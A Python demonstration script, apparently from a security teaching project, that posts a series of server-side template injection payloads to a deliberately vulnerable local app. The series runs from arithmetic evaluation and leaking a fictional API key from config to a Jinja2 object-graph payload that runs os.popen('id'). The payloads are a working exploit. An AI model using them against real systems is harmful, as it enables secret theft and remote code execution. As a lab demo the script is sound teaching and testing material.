"""One-shot demonstration of the SSTI escalation ladder against the vulnerable app.

Runs over real HTTP against the intentionally vulnerable application and prints the
escalation ladder: expression evaluation, integration-secret disclosure, the
planted ``DEMO_SENTINEL`` reach, and object-graph traversal to ``os.popen('id')``.
The only command executed is the read-only ``id``. Exits non-zero if the expected
(deliberately insecure) outcomes do not hold.
"""

from __future__ import annotations

import os
import sys

import httpx

from contextless.config import DEMO_SENTINEL, FICTIONAL_INTEGRATION_API_KEY
from contextless.domain.fixtures import GLOBEX_TOKEN

BASE_URL = os.environ.get("CONTEXTLESS_VULNERABLE_URL", "http://127.0.0.1:8001")
ORDER_REFERENCE = "1001"
RCE_PAYLOAD = "{{ cycler.__init__.__globals__.os.popen('id').read() }}"

STEPS: list[tuple[str, str]] = [
    ("benign body", "Order {{ order.number }} for {{ order.customer_name }} has shipped"),
    ("expression evaluation", "{{ 7*191 }}"),
    ("integration secret disclosure", "{{ config.integration_api_key }}"),
    ("planted DEMO_SENTINEL reach", "{{ config.demo_sentinel }}"),
    ("object-graph RCE — os.popen('id')", RCE_PAYLOAD),
]


def main() -> int:
    failures: list[str] = []
    with httpx.Client(base_url=BASE_URL, timeout=10.0) as client:
        print(f"contextless VULNERABLE demo → {BASE_URL}\n")
        print("This app is intentionally insecure: it compiles user input as a template.\n")
        print(f"{'ladder step':<36} | rendered output")
        print("-" * 100)

        results: dict[str, str] = {}
        for label, body in STEPS:
            response = client.post(
                "/notifications/preview",
                headers={"Authorization": f"Bearer {GLOBEX_TOKEN}"},
                json={"body": body, "order_reference": ORDER_REFERENCE},
            )
            response.raise_for_status()
            rendered = response.json()["rendered"].strip()
            results[label] = rendered
            print(f"{label:<36} | {rendered}")

        if results["expression evaluation"] != "1337":
            failures.append("expression did not evaluate to 1337")
        if FICTIONAL_INTEGRATION_API_KEY not in results["integration secret disclosure"]:
            failures.append("integration secret was not disclosed")
        if DEMO_SENTINEL not in results["planted DEMO_SENTINEL reach"]:
            failures.append("DEMO_SENTINEL was not reached")
        if "uid=" not in results["object-graph RCE — os.popen('id')"]:
            failures.append("object-graph did not reach code execution")

    print()
    if failures:
        print("DEMO RESULT: FAIL")
        for item in failures:
            print(f"  - {item}")
        return 1
    print("DEMO RESULT: the vulnerable app evaluated input, leaked the secret, and ran `id`.")
    print("Only the read-only `id` ran; domain state is unchanged; the container has no egress.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
